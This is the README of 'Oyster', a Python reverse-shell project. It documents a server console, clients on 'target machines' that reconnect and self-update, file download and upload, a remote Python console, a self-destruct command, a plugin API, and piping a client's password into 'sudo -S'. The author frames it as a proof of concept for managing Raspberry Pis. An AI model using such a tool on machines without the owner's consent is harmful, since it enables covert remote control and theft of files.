```python
 .oOOOo.
.O     o.
O       o               O
o       O              oOo
O       o O   o .oOo    o   .oOo. `OoOo.
o       O o   O `Ooo.   O   OooO'  o
`o     O' O   o     O   o   O      O
 `OoooO'  `OoOO `OoO'   `oO `OoO'  o
              o
           OoO'
```

Oyster is a lightweight multi-threaded "reverse shell" written in pure 
python 3.  The server can push updates to the clients, and the clients 
will overwrite/restart themselves.  Client/Server/Server Shell commands 
can also be added using the plugin system so you don't have to modify
the `client.py` or `server.py` scripts directly.

I wrote this after finding an example reverse shell on the thenewboston 
youtube channel.  I saw some things I wanted to improve, so that's what 
I attempted to do.  The clients will continuously try to make a 
connection with the server.

_Disclaimer:  This was written and is continued to be maintained because
I enjoy writing code with web sockets and since I tinkered with the 
initial version, it has evolved into a useful tool for myself(managing
raspberry pi's over the network without having to SSH and transferring 
files to the pythonista app).  Most of the functionality was written as 
a "proof of concept", so it isn't meant to be secure or work as an
actual reverse shell._

## Control Server

Start `server.py` from the command line.  Here are the keyword arguments 
used for `server.py`:

```
host        - Host IP address.
port        - Host port.
recv_size   - Buffer size for receiving and sending data.
listen      - Maximum number of queued connections.
bind_retry  - How many times to retry binding the socket to the port.
```

Example:

All of the arguments provided below are the defaults except `host`, 
which is a blank string as the default.

```
python3 server.py host=0.0.0.0 port=6667 recv_size=1024 listen=10 bind_retry=5
```

You can also modify the `server.py` & `client.py` file directly to 
hardcode the information into the starting variables if that is your
thing.

## Oyster Shell

The Oyster Shell is the main interface.  It's what you use to select 
which clients you would like to send commands to, and push updates to 
the `client.py` file on all of the connected target machines.  You know
you're working with the Oyster Shell if you see the following prompt:

```
Oyster> 
```

Commands for the `Oyster` shell are:

```
list                        -   List the connected clients.
    
update all                  -   Update all the connected clients using 
                                `update.py`.  Clients will overwrite 
                                themselves and reboot themselves.
                                
use {target ip/index}       -   Use a target connection.  {target ip/index} 
                                can be found by running the `list` command.

upload                      -   Upload a file to a client.

plugins -r                  -   Reload all plugins.

plugins -l                  -   List all plugins.

plugins -lo                 -   List all outgoing plugins.

plugins -ls                 -   List all oyster shell plugins
                                
quit                        -   Shut everything down.

client -c                   -   Copy the client-specific files to the 
                                "dist" folder.
```

### Oyster Shell's `use` Command

The `use` command will drop you into a client shell.  This is used to 
navigate and manipulate the client's computer.  Once executed, the `use` 
command will drop you into a shell for the given connection[ip address 
or index givin by the `list` command].  You'll know you're in a client 
shell when you see an ip address along with a directory structure with a
`> ` at the end:

```
<10.0.0.8> /Some/Directory> 
```


To get out of the connection's shell, run the `quit` command.  This will 
take you back to the `Oyster` shell.

Example:

```
Oyster> use 10.0.0.8
<10.0.0.8> /Users/SomeUser/Remote/Computer/Where/Client.py/Is/Stashed> quit
Oyster> 
```

### Client Shell Commands

There are other client shell commands besides `quit`:

```
get "{target filepath}" "{local filepath}"      -   Download a file from 
                                                    the target.

upload {local filepath} {target filepath}       -   Upload a file to the
                                                    target.

sysinfo                                         -   Get system info from
                                                    the target.

plugins -r                                      -   Reload all plugins.

plugins -l                                      -   List all plugins.  
                                             
oyster reboot                                   -   Reboot the selected
                                                    client.
                                                    
client -s {key} {value}                         -   Wrapper around 
                                                    python's `setattr` 
                                                    function.  It will
                                                    set an attribute
                                                    on the `Client`
                                                    object.
                                                    
client -g {key}                                 -   Wrapper around
                                                    python's `getattr`
                                                    function.  It will
                                                    get an attribute
                                                    from the `Client`
                                                    object.
                                       
client -r                                       -   Reboot the client.py
                                                    script.
                                                    
client -sh                                      -   Shut down the client.py
                                                    script.
                                                    
client -i                                       -   Enter an interactive 
                                                    Python console. Use 
                                                    `exit()` to exit.  
                                                    The `Client` object 
                                                    is accessible through 
                                                    the `client` variable 
                                                    when in the console.
                                                    Any changes will persist.
                                                    
oyster self-destruct                            -   Removes the client 
```

Example:

```
Oyster> use 10.0.0.8
<10.0.0.8> /Users/SomeUser/Where/The/Client/Is/Stashed> get ~/Music/song.m4a song.m4a
< File Stashed: song.m4a >
<10.0.0.8> /Users/SomeUser/Where/The/Client/Is/Stashed> 
```

### Adding Client/Server/Shell Commands

A plugin api is available for adding client/server/server shell commands.  
The `get` command is actually implemented as a plugin.  Check out the 
`Get.py` file in the `client_plugins` folder for an [example plugin](https://github.com/Wykleph/Oyster/blob/master/client_plugins/Get.py).


#### Plugin Design

In order to know how to write plugins, you probably need some basic info 
on how everything works under the hood.

The basic idea is that a `command`/`data` is dispatched to the `client` 
from the `server`, and then the `client` responds with a `result` and 
waits for another `command`. The `client` _should_ response with 
_something_ to let the server know it is finished with it's job, 
or to send it data.

Example:

```python
# Server-side
server.send_command('say hello, client')

# This would be from within a plugin after the client
# received data and was ready to respond.
client.send_data('hello!')
```

You can also send data back to the client in chunks instead of sending 
it all at once:

```python
# Server-side
server.send_command('say hello, client')

# This would be from within a plugin after the client
# received data and was ready to respond.
msg = 'hello world!'
for letter in msg:
    client.send_data(letter, chunks=True)
client.terminate()
```

It's important to note that setting the `chunks` flag only tells the
`client` not to send the termination string back to the server, so 
depending on which `ServerConnection` and `ClientConnection` objects
you are using, you may not be able to use the `chunks` flag.

A lot of commands can be implemented with a client-side plugin, however 
in certain cases a `server` plugin, or Oyster `shell` plugin would be 
required for more advanced functionality(downloading files, editing
files remotely).

A client plugin must be a python file with a `Plugin` class that has a 
`version` attribute, an `invocation` attribute that tells it what 
command invokes the plugin. It must also contain an `enabled` attribute 
that can be used to disable or enable plugins.  Just change the value to 
enable or disable a plugin. A `run` method that takes an instance of the 
`Client` object and a string of `data` as the two arguments.  Example. 
This plugin tells the client to `say` something(the data just gets sent 
back to the server and printed):

```python
import shlex

class Plugin(object):
    """
    Make the client say something.
    """
    
    version = 'v1.0'
    invocation = 'say'
    enabled = True
    
    def run(self, client, data):
        args = shlex.split(data)
        
        client.server_print(' '.join(args))
```

A server/oyster shell plugin is written exactly like a client plugin, 
except the `run` method takes a `Server` instance as the first argument
instead of a `Client` instance.  The `Server` instance uses a method 
called `send_command` to send data to the `Client` instead of `send_data` 
or `server_print`.

A `shell` plugin only runs if you are in the `Oyster>` shell.  A server 
plugin runs on the server-side just before a command is sent to a client.
This enables all sorts of additional functionality like sending commands 
to all of the connected clients at once. The `Server` uses the
`ConnectionManager` to manage all of the connected `client`s. 
Documentation on the `ConnectionManager` will be coming soon.

The `client_plugins/Get.py` file is what handles the `get` command sent 
from the server.  The `outgoing_plugins/Get.py` file handles the 
server-side implementation of the `get` command.  A simpler plugin 
example can be found in the `client_plugins/SysInfo.py` file.  It runs 
some functions to gather some basic information about the clients 
system, then sends it to the server. Be careful implementing command 
plugins as you can override an operating system's commands.  If you do
override an OS command and want to use it, escape it(`\cd`). Look at the 
`ChangeDirectory` plugin in the `client_plugins` to see a good example 
of how the `cd` command is actually implemented in python, and not using 
the native OS command.

### Using `sudo` with connected clients

`echo` the password and pipe it into the `sudo` command with the `-S`
flag.

```
echo "ClientsPassword" | sudo -S chown $USER:admin /usr/local/include
```

You may need to add a newline character to the end of your password.

```
echo "ClientsPassword\n" | sudo -S chown $USER:admin /usr/local/include
```

Check out the `man` pages for `sudo` on the client if this doesn't work.
I'm not sure how much the `-S` flag differs between unix flavours.

## Client

Start `client.py` on the target machine.  The client should keep itself
up and running, unless it errors out for some odd reason.  When updates
are pushed to the client from the server, the client will overwrite
and restart itself.  Here are startup arguments.

```
host
port
recv_size
```

Example:

```
python3 client.py host=10.0.0.215 port=6667 recv_size=1024
```

### File Editor:

This plugin is designed for using local server-side tools to edit client-
side files!  As it stands, only small files are supported. Any file that 
can be opened and edited from the command line should be editable!  This
isn't limited to text files either.

If you have `suplemon` installed locally, you can use the syntax:

    <127.0.0.1> /Users/user/Oyster> # {filepath}

to open any text file for editing without having to type the name of the 
editor.

For more complicated editing(audio, pictures, video, etc), you can tag 
the filename in question with `<f>` and provide more arguments.

Example of using imagemagick to resize a picture:

    `/Users/user/Pictures> magick ~/Pictures/drink.jpg -resize 50% drink.jpg`

  becomes

    `/Users/user/Pictures> # magick <f>~/Pictures/drink.jpg -resize 50% <f>drink.jpg`

If you ran the first example, it would try to use imagemagick on the 
client machine whereas the second example would grab the filedata(for 
the first tagged filename in the command), from the client machine and 
then use imagemagick to edit it locally before sending the modified data 
back to the client.